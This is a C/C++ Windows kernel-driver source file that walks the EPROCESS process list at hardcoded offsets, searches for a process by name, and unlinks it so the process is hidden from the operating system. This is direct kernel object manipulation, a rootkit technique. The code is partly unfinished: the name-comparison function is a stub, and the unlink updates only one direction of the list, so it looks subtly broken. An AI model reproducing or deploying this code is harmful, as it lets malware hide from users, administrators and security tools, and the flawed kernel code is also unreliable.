#include "ProcTools.h"


void printCurrentProcessName()
{
	PEPROCESS currp = PsGetCurrentProcess();
	char name[] = "11ffdfgsgfdg3sfg";
	memcpy(&name, (char*)currp + LOC_NAME, 15);
	dprint("name : ");
	dprint(name);
	dprint("\n\n");
}

int listProcesses(char processes[])
{
	int counter = 0;
	char* tmp = processes;

	PEPROCESS curr_p = PsGetCurrentProcess();
	dprint("loop starts\n\n");
	do
	{
		char name[NAME_SIZE] = "";
		memcpy(&name, (char*)curr_p + LOC_NAME, NAME_SIZE);
		//DbgPrintEx(0,0,"Process name: %s\n", name);

		strncpy(tmp, name, strlen(name));
		tmp += strlen(name);
		*tmp = '|';
		tmp++;

		curr_p = getNextProcess(curr_p);

		//DbgPrintEx(0,0,"counter: %d\n\n", counter + 1);
		counter++;
	} while (curr_p != PsGetCurrentProcess() && counter != ROTATION_LIMIT);

	dprint("loop ends\n\n");

	return int(tmp - processes);
}

int compareNames(char processName[], char searchedName[])
{
	//TODO: add check if the searched name apear as a whole inside of the process name
	//TODO: split the searched name by spaces and\or capital letters and other saperation characters,
	// and than search an apearance of each part in the process name. 
	dprint(searchedName);
	dprint(processName);
	dprint("you are not supose to be here");
	return 0;
}

PEPROCESS getNextProcess(PEPROCESS curr)
{
	// get the linked list object that hold the pointer to the next object
	_LIST_ENTRY entry;
	memcpy(&entry, (char*)curr + LOC_ENTRY, sizeof(_LIST_ENTRY));

	// get the pointer to the next linked list object from
	PLIST_ENTRY next = entry.Flink;

	// calculate the location of the start of the eprocess object using the location of his linked list object  
	char* res;
	res = (char*)next - LOC_ENTRY;

	return (PEPROCESS)res;
}

PEPROCESS findProcessByName(const char dst_name[], bool deepSearch)
{
	int counter = ROTATION_LIMIT;
	int reslist_counter = 0;
	comparisonRes reslist[ROTATION_LIMIT] = { nullptr, 0 };

	PEPROCESS curr_p = PsGetCurrentProcess();

	char lower_case_name[NAME_SIZE] = "";
	lowercase(dst_name, lower_case_name);

	do
	{
		char name[NAME_SIZE] = "";
		char lower_case_pname[NAME_SIZE] = "";
		memcpy(&name, (char*)curr_p + LOC_NAME, NAME_SIZE);

		lowercase(name, lower_case_pname);

		// compare the names 
		if (deepSearch) {
			int res = compareNames(lower_case_pname, lower_case_name);
			if (res == FULL_MATCH) { // if the searched name was found full in the process name
				return curr_p;
			}
			else if (res > NO_MATCH) { // if parts from the searched name were found in the process name 
				reslist[reslist_counter++] = { curr_p, (unsigned short)res };
			}
		}
		else {
			if (!strcmp(lower_case_name, lower_case_pname))
				return curr_p;
		}

		curr_p = getNextProcess(curr_p);
		counter--;

	} while (curr_p != PsGetCurrentProcess() && counter);

	// TODO: add returning of the process pointer from the 'reslist' that has the biggest amount of 
	// matches to the searched name.

	return nullptr;
}

void removeProcessFromList(PEPROCESS process)
{
	// get the linked list object that hold the pointer to the prev object
	_LIST_ENTRY entry;
	memcpy(&entry, (char*)process + LOC_ENTRY, sizeof(_LIST_ENTRY));

	// get the pointer to the previous and the next linked list objects from current object
	PLIST_ENTRY previous = entry.Blink;
	PLIST_ENTRY next = entry.Flink;

	// coppy the addres of the next linked list object to the 'next' object of the previous object 
	memcpy(previous + LOC_NEXT_ENTRY, &next, sizeof(PLIST_ENTRY));

}

int hideProcess(char procName[])
{
	dprint("Finding the process object to hide... \n\n");
	PEPROCESS dst = findProcessByName(procName, SIMPLE_SEARCH);
	dprint("search ended\n\n");

	if (dst == nullptr) {
		dprint("Search have faild. Tryign more complicated comparation methods... \n\n");
		dst = findProcessByName(procName, COMPLICATED_SEARCH);

		if (dst == nullptr) {
			dprint("Complicated Search have faild. Operation cancled. Check if the name of the process is correct and try again.");
			return 0;
		}
	}
	dprint("removing\n\n");
	removeProcessFromList(dst);

	return 1;
}
